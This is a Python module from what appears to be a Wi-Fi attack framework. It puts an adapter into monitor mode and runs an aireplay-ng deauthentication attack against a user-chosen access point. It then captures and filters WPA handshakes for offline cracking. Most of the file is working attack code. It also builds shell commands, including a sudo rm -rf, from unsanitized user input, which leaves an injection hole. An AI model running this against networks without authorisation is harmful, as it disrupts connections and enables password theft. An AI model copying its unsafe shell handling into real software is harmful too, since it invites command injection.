# THIS IS HANDSHAKE MODULE
# Authors : AuxgreP & Shedyz

import subprocess
import sys
import os
import time
from tkinter import * 
from prettytable import PrettyTable

ITALIC = "\033[3m"
purple = '\x1b[38;5;165m'
blue = '\x1b[38;5;33m'
red = '\x1b[38;5;196m'
green = '\x1b[38;5;118m'
grey = '\x1b[38;5;0m'
pink = '\x1b[38;5;199m'
END = "\033[0m"
UNDERLINE = "\033[4m"
BOLD = "\033[1m"
BLINK = "\033[5m"
BROWN = "\033[0;33m"


config_iw = 'iwconfig' # to make sure user can see all connected interface
table = PrettyTable()
class handshake_module1():
    try:

        def monitor(): # starting monitoring mode
            nm = [x for x in subprocess.getoutput("ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'").replace("\n","").split(":") if x]
            # Show only Interface
            def show_iwconf(tb):
                print('NETWORK INTERFACES\n'.center(50))
                cnt = 0
                x = tb
                x.field_names = ["ID", "NAME"]
                x.align["NAME"] = "l"
                for interface in nm:
                    #print(f"{cnt} : {interface}".center(50))
                    x.add_row([f"{cnt}", f"{interface}"])
                    cnt+=1
                print(x)
                x.clear()
                print("")
            show_iwconf(table)
            interface = str(input(f'{BROWN}Write Monitor interface: {END}'))
            if interface.isdigit():
                interface = nm[int(interface)]
            os.system('clear')
            monitor_1 = subprocess.run(f'sudo airmon-ng start {interface} > /dev/null'\
                ,shell=True) # This will put adapter in monitor mode
            os.system('clear')
            print('')
            show_iwconf(table)
            monitor_interface = str(input(f'{BROWN}ENter monitor mode interface: {END}')) # user will put interface for monitor mode
            if monitor_interface.isdigit():
                monitor_interface = nm[int(monitor_interface)]
            # ask user to continue with Handshakes hunter
            print('')
            print(f'{BROWN}{BOLD}{ITALIC}Choose target to attack (BSSID and CHANNEL, {END}{red}Press CNTL + C to stop){END}'.center(100))
            time.sleep(4)

            try:
                # starting scanning general network to detected AP's
                cmd2 = subprocess.run(f'sudo airodump-ng {monitor_interface}', shell=True)
                print('')
                BSSID = str(input(f'{BROWN}Enter Target BSSID:{END} ')) # grab choosen BSSID to attack
                CHANNEL = int(input(f'{BROWN}Enter Channel no:{END} ')) # grab choosen CHANNEL to attack 
                ESSID = str(input(f'{BROWN}Enter ESSID:{END} '))        # grab choosen ESSID -> name of a network

                #attacking 
                os.system('clear')
                print(f'{red}{BOLD}{ITALIC}Starting Handshake HUnter Module{END}'.center(120))
                print('')
                time.sleep(3)
                command = f"sudo xterm -geometry 96x24-0+0 -fg green -title Control -e sudo airodump-ng --bssid {BSSID} \
                    --channel {CHANNEL} {monitor_interface} --ignore-negative-one -w network_captures_handshakes/{BSSID}.cap &"
                xcommand = f"sudo xterm -geometry 96x24-0-0 -fg red -title Deauth -e sudo aireplay-ng --deauth 25 -a {BSSID} {monitor_interface} &"

                # Disconnected all clients from the choosen BSSID and CHANNEL
                cmd3 = subprocess.run(command, shell=True)
                time.sleep(4)
                xcmd = os.system(xcommand)
                os.system('clear') # We need Clean Window 
                
                # Handshakes hunting function
                print(f'{purple}{BOLD}{ITALIC}JUST WAIT FOR STATUS MESSAGE....!!!{END}'.center(100))
                os.system(f"xterm -geometry '96x24+0-0' -fg 'steelblue' -T 'EAPOL INTERCEPTOR ON {monitor_interface}' -e \
                    zsh -l -c 'sudo tcpdump -i {monitor_interface}' &")
                os.system('clear')
                print(f'{purple}wait!!!!!{END}'.center(120))
                time.sleep(5) # high time sleep rate to make sure we manage to capture HQ handshakes
                os.system('clear')
                time.sleep(5) # by increasing this number will make a framework to capture very HQ handshakes :)

                os.system('clear')
                print(f'{red}{BOLD}{ITALIC}{BLINK}waiting to close all xterm sessions{END}'.center(120))
                time.sleep(20) #To make sure we get handshakes by waiting clients to be connected after deauthentication attack
                time.sleep(8) # we need special procedure to kill xterm sessions
                os.system('clear')
                subprocess.run('sudo killall xterm > /dev/null',shell=True)
                
                os.system('clear')
                save = input(f'{BROWN}{BOLD}Do You manage to captured handshakes!? {END}{red}(yes/no):{END} ') #ask a user 

                if save == 'yes'.lower():
                    os.system('clear')
                    print('{1}okay saved as {0}.cap-01{2} on network_captures_handshakes folder'.format(BSSID, green, END)) #showing saved handshakes
                    subprocess.run(f'sudo airmon-ng stop {monitor_interface} > /dev/null', shell=True)
                    # Handshakes verification
                    os.system('clear')
                    time.sleep(2)
                    print(f'{ITALIC}{green}{BOLD}Wait we are verify and Exporting handshakes captured on {BSSID}-{ESSID}{END}')
                    verify= f'tshark -r network_captures_handshakes/{BSSID}.cap-01.cap -R "(wlan.fc.type_subtype == 0x08 || \
                        wlan.fc.type_subtype == 0x05 || eapol) && wlan.addr == {BSSID}" \
                            -2 -w network_captures_handshakes/Handshakes-{ESSID}.cap -F pcap'
                    time.sleep(2)
                    os.system(verify)
                    os.system('clear')
                    print(f'{green}Done!!!{END}{BROWN}your handshakes saved as{END}{red}Handshakes-{ESSID}.cap on{END}network_captures_handshakes folder'\
                        .center(100))
                    os.system(f"sudo rm -rf network_captures_handshakes/{BSSID}.*")
                    time.sleep(4)
                    subprocess.run('clear', shell=True) # to much memory handles
                    print('WE ARE GOING BACK TO MAIN MENU IN 1....2.....3...')
                    time.sleep(3)    
                else:
                    os.system(f"sudo rm -rf network_captures_handshakes/{BSSID}.*") # deleting all files if condition is FALSE
                    sys.exit(f'{green}byeee!!{END}{purple} Thank you for using our Framework{END}')           
                      
            except OSError:
                os.system('clear')
                sys.exit(f"\nUnkwown Error occured!! its a bug?? report it now \
                    >> mranonymoustz@tutanota.com".center(100))

        monitor();
        
    except KeyboardInterrupt:
        os.system('clear') #EXIT when user is pressing CONTL + C
        print('\nExiting !! Thanks for using the framework!!'.center(100))

            